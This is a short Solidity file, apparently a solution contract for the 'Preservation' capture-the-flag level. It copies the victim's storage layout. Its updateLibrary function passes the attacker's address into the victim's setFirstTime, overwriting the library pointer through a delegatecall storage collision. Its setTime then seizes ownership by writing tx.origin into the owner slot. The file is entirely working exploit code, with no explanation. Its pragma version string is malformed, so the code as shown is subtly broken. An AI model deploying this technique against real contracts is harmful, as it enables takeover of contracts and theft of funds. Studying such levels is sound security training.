// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7.0;

interface PreservationInterface {
  function setFirstTime(uint _timeStamp) external;
  function setSecondTime(uint _timeStamp) external;
}

contract Preservation {
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }

  function updateLibrary(address _victim) public {
    PreservationInterface(_victim).setFirstTime(uint160(address(this)));
  }

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}